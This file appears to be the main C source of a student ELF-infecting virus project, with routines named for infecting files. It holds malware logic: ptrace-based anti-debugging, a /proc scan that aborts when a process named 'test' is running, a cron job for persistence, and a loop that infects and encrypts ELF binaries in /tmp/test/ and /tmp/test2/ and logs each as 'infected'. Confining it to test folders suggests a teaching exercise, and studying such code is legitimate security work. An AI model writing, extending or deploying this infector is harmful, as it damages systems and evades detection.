#include "death.h"

void log_bonus(char* filename, char* msg){
    int fd;
	fd = open("./log_bonus.txt", O_WRONLY | O_CREAT | O_APPEND, 0755);
    if (fd > 0)
	{
        write(fd, filename, ft_strlen(filename));
        write(fd, msg, ft_strlen(msg));
		close(fd);
	}
}

void do_virus(char* dirName, t_woody *woody, char *path)
{
    DIR *dir;
    struct dirent *ent;

    if ((dir = opendir(dirName)) != NULL)
    {
        while ((ent = readdir(dir)) != NULL)
        {
            if (ft_strcmp(ent->d_name, ".") != 0 && ft_strcmp(ent->d_name, "..") != 0)
            {
                if (read_elf_file_bonus(woody, ft_strjoin(dirName, ent->d_name), path) == ERROR_CODE)
                {
                    free(woody->addr);
                    continue;
                }
                if (parse_info(woody) == ERROR_CODE)
                {
                    free(woody->addr);
                    continue;
                }
                if (encrypt_func(woody, ft_strjoin(dirName, ent->d_name)) == ERROR_CODE)
                {
                    free(woody->addr);
                    continue;
                }
                log_bonus(ent->d_name, " - infected!\n");
                free(woody->addr);
            }
        }
        closedir(dir);
    }
}

int check_process()
{
    DIR *dir;
    struct dirent *ent;
    char buf[512];

    if (!(dir = opendir("/proc")))
    {
        return (ERROR_CODE);
    }

    while ((ent = readdir(dir)) != NULL)
    {
        if (atoi(ent->d_name) != 0)
        {
            snprintf(buf, sizeof(buf), "/proc/%s/stat", ent->d_name);
            int fd = open(buf, O_RDONLY);

            if (fd >= 0)
            {
                int size;
                if ((size = read(fd, buf, 512)) > 0)
                {
                    buf[size - 1] = '\0';
                    if (strstr(buf, "test") != NULL){
                        return (ERROR_CODE);
                    }
                }
                close(fd);
            } else {
                return (ERROR_CODE);
            }
        }
    }
    return (0);
}

int main(int argc, char **argv)
{
    (void)argv;
    if (argc != 1)
    {
        return (ERROR_CODE);
    }

    if (ptrace(PTRACE_TRACEME, 0, 1, 0) < 0)
    {
        printf("DEBUGGING..\n");
        exit(1);
    }

    if (check_process() == ERROR_CODE)
    {
        return (ERROR_CODE);
    }

    create_cron(argv[0]);

    t_woody woody;
    ft_memset(&woody, 0, sizeof(woody));

    time_t rawtime;
    struct tm * timeinfo;
    time ( &rawtime );
    timeinfo = localtime ( &rawtime );
    log_bonus("", asctime (timeinfo));

    do_virus("/tmp/test/", &woody, argv[0]);
    do_virus("/tmp/test2/", &woody, argv[0]);



    return (0);
}

